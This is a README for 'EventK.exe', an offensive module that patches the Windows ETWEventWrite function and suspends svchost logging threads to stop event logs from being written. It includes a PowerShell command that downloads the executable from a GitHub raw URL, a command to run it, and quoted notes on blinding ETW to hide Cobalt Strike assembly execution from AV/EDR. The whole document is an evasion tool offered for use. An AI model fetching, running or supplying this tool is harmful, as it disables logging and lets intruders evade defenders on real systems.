## Module Name
   <b><i>EventK.exe</i></b>

|Binary Name|Description|Privileges|Notes|
|---|---|---|---|
|EventK|Patch the ETWEventWrite function to<br />prevent the creation of logfiles|Administrator|Suspend thread in svchost.exe related<br />to event logging (@SolomonSklash)<br />[Screenshot](https://naoexiste)|

<br />

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/EventK.exe" -OutFile "EventK.exe"
```

<br />

```powershell
.\EventK.exe
```

<br />

**Final Notes:**
```powershell
[ETW Bypass]
Next up is coverage of Event Tracing for Windows (ETW), how it can rat you out to AV/EDR,
and how to blind it in your local process. ETW is especially relevant when executing .NET
assemblies, such as in Cobalt Strike’s execute-assembly, as it can inform defenders of the
exact assembly name and methods executed. The solution in this case is simple: Patch the
ETWEventWrite function to return early with 0 in the RAX register. Anytime an ETW event
is sent by the process, it will always succeed, without actually sending the message.
```

Article: https://www.solomonsklash.io/windows-evasion-course-review.html
